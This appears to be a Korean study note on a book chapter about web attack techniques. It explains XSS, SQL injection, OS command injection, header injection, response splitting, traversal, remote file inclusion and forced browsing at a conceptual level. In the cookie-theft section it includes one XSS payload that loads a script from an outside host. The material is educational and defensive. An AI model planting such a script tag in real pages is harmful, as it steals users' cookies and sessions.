## 11장. 웹 공격 기술

HTTP 자체는 보안 상의 문제가 일어날 정도로 복잡한 프로토콜은 아니기 때문에 

프로토콜 자신이 공격 대상이 되는 경우는 거의 없다. 

<br/>

그렇다면 공격 대상이 되는 것은 HTTP를 사용하는 서버와 클라이언트 그리고 서버 상에서 동작하는 웹 애플리케이션 등의 리소스이다.

```
현재 인터넷에서 벌어지는 공격 대부분이 웹 사이트를 노린 것이다.
```

그 중에서도 특히 웹 애플리케이션을 대상으로 많은 공격이 발생하고 있다.

<br/><br/>

### HTTP에는 보안 기능이 없다.

웹 사이트 대부분은 인증이나 세션 관리, 암호화 등의 보안 기능이 필요하지만 이들은 HTTP에 없다.

때문에 웹 애플리케이션에서 인증이나 세션 관리 기능을 개발자가 설계하고 구현할 필요가 있다.

<br/>

그 결과, 보안 등급이 충분치 못하고 공격자가 약용할 수 있는 취약성과 같은 버그가 있는 상태로 가동되고 있는 웹 애플리케이션이 있다.

<br/><br/>

### 리퀘스트는 클라이언트에서 변조 가능

웹 애플리케이션이 브라우저로부터 수신한 HTTP 리퀘스트의 내용은 모든 클라이언트에서 자유롭게 변경하고 변조할 수 있다. 

```
그렇기 때문에 웹 애플리케이션이 기대하고 있는 값과는 다른 값이 보내질 가능성이 있다.
```

<br/>

웹 애플리케이션에 대한 공격은 HTTP 리퀘스트 메시지에 공격 코드를 실어서 실행된다.

쿼리나 폼, HTTP 헤더, 쿠키 등을 경유해서 보내져 웹 애플리케이션에 취약성이 있을 경우에는 

정보를 도둑맞거나 권한을 빼앗기는 일이 발생한다.

<br/><br/>

### 웹 애플리케이션에 대한 공격 패턴

- 능동적 공격
- 수동적 공격

<br/>

### 서버를 노리는 능동적 공격

공격자가 직접 웹 애플리케이션에 액세스해서 공격 코드를 보내는 타입의 공격이다.

능동적 공격의 대표적인 공격에는 SQL 인젝션과 OS 커맨드 인젝션 등이 있다.

<br/><br/>

### 유저를 노리는 수동적 공격

수동적 공격은 함정을 이용해서 유저에게 공격 코드를 실행시키는 공격이다.

수동적 공격에서는 공격자가 직접 웹 애플리케이션에 액세스해서 공격을 하지 않는다.

<br/><br/>

### 유저가 처한 환경을 이용한 인트라넷 등에 대한 공격

수동적 공격을 이용하면 인트라넷 같은 인터넷에서 직접 액세스할 수 없는 네트워크를 공격할 수 있다. 

공격자가 설치한 함정에 유저가 액세스할 수 있는 네트워크라면 인트라넷도 공격 할 수 있다.

<br/><br/>

## 출력 값의 이스케이프 미비로 인한 취약성

웹 애플리케이션의 보안 대책을 실시하는 장소를 크게 나누면 다음과 같다.

- 클라이언트에서 체크
- 웹 애플리케이션에서 체크

클라이언트 측에서의 체크는 대부분 JavaScript를 사용한다.

변조 되었거나 무효화될 가능성이 있기 때문에 근본적인 보안 대책으로는 적합하지 않다.

<br/>

클라이언트 측의 체크는 입력 실수를 바로 지정해 주는 정도, 즉 UI 향상을 위한 정도로 사용한다.

웹 애플리케이션에서 처리한 데이터를 데이터베이스나 파일 시스템, HTML, 메일 등에 

출력할 때 출력하는 곳에 따라 값을 이스케이프 처리하는 출력 값의 이스케이프가 보안 대책으로 중요하다.


<br/><br/>

### 크로스 사이트 스크립팅

크로스 사이트 스크립팅은 취약성이 있는 웹 사이트를 방문한 사용자의 브라우저에서 

부정한 HTML 태그나 JavaScript 등을 동작시키는 공격이다.

<br/>

동적으로 HTML을 생성하는 부분에서 취약성이 발생할 수도 있다.

공격자가 작성한 스크립트가 함정이 되고 유저의 브라우저 상에서 움직이는 수동적 공격이다.

<br/><br/>

### XSS는 공격자가 함정을 준비하는 수동적 공격

크로스 사이트 스크립팅은 수동적 공격이기 때문에 공격자는 함정을 준비하게 된다.

사이트는 URI의 쿼리에 ID를 지정함으로써 폼 내에 문자열을 보완하는 기능이 있다.

<br/><br/>

### 유저의 쿠키를 빼앗는 공격

폼에 함정을 설치하는 것 외에도 스크립트를 추가하여 유저의 쿠키를 크로스 사이트 스크립팅으로 빼앗을 수 있다.

```
<script src=http://hackr.jp/xss.js></script>
```

<br/><br/>

### 부정한 SQL을 실행하는 SQL 인젝션

SQL 인젝션이란 웹 애플리케이션을 이용하고 있는 데이터베이스에 SQL을 부정하게 실행하는 공격이다. 

큰 위협을 일으킬 수 있는 취약성으로 개인 정보나 기밀 정보 누설로 직결되기도 한다.

<br/>

검색 및 추가, 삭제와 같은 처리가 발생할 경우 SQL을 사용해서 데이터베이스에 액세스 한다.

만약, SQL의 호출 방법에 미비가 있을 경우, 의도하지 않은 SQL문이 삽입되어 실행되어 버리는 경우가 있다.

<br/><br/>

### OS 커맨드 인젝션

OS 커맨드 인젝션이란? 웹 애플리케이션을 경유하여 OS 명령을 부정하게 실행하는 공격이다.

쉘을 호출하는 함수가 있는 곳에서 발생할 가능성이 있다.

<br/>

OS에서 사용되는 커맨드를 쉘을 경유해서 실행할 수 있다. 


쉘의 호출 방법에 취약한 부분이 있다면 잘못된 OS 커맨드가 삽입되어 실행되어 버리는 경우가 있다.

<br/><br/>

### HTTP 헤더 인젝션

HTTP 헤더 인젝션이란 공격자가 리스폰스 헤더 필드에 개행 문자 등을 삽입함으로써 

임의의 리스폰스 헤더 필드나 바디를 추가하는 수동적 공격이다. 

<br/>

특히 바디를 추가하는 공격을 HTTP 리스폰스 분할 공격이라고 부른다.

리스폰스 헤더 필드 Location 과 Set-Cookie의 값에 외부에서 받은 값을 삽입하는 일이 있다.

```
Location: http//www.example.com/a.cgi?q=12345
Set-Cookie: UID=12345

*12345가 삽인된 값
```

<br/><br/>

### HTTP 리스폰스 분할 공격

HTTP 리스폰스 분할 공격은 HTTP 헤더 인젝션을 응용한 공격이다.

HTTP/1.1의 복수 리스폰스를 모아서 돌려보내는 기능을 약용해서 캐시 서버 등에 임의의 콘텐츠를 캐시하는 것도 가능하다. 

이 공격을 캐시 오염이라고 부르기도 한다.

<br/>

이 캐시 서버를 이용하고 있는 유저는 공격을 받은 사이트를 열람하면 바뀌어진 웹 페이지를 계속해서 참조하게 된다.

<br/><br/>

### 메일 헤더 인젝션

메일 헤더 인젝션은 웹 애플리케이션의 메일 송신 기능에 공격자가 임의의 To 및 Subject 등의 메일 헤더를 부정하게 추가하는 공격입니다.

취약성이 있는 웹 사이트를 이용해서 스팸 메일이나 바이러스 메일 등을 임의의 주소에 송신할 수 있다.

<br/><br/>

### 디렉토리 접근 공격

디렉토리 트래버설이란 비공개 디렉토리의 파일에 대해서 부정하게 디렉토리 패스를 가로질러 액세스하는 공격이다. 

이 공격을 패스 트래버설이라 부르기도 한다.

<br/><br/>

### 리모트 파일 인클루션

리모트 파일 인클루션은 스크립트의 일부를 다른 파일에서 읽어올 때 공격자가 지정한 

외부 서버의 URL을 파일에서 읽게 함으로써 임의의 스크립트를 동작시키는 공격이다.

<br/><br/>

## 웹 서버의 설정이나 설계 미비로 인한 취약성

웹 서버를 잘못 설정하거나 잘못 설계할 때 생긴 문제 등에 의해 발생하는 취약성이다.

<br/><br/>

### 강제 브라우징

강제 브라우징은 웹 서버의 공개 디렉토리에 있는 파일 중에서 공개 의도가 없는 파일이 열람되게 되는 취약성이다.

<br/>

공개하고 싶지 않은 파일의 URL을 숨기는 보안 대책에 의존하고 있는 경우 해당 URL을 알게 되면 파일을 열람할 수 있게 된다.

예측하기 쉬운 파일이나 디렉토리의 인덱스가 표시된 경우, 어떠한 방법으로 URL이 누설되었을 경우에도 발생할 가능성이 있다.

<br/><br/>

## 세션 관리 미비로 인한 취약성

세션 관리는 유저의 상태를 관리하기 위한 기능이지만, 이 세션 관리 기능이 취약한 경우 유저 인증 상태를 빼앗겨 버리는 피해가 발생한다.

<br/><br/>

>**Reference** 
> <br/> [
그림으로 배우는 HTTP & Network](http://www.yes24.com/Product/Goods/15894097)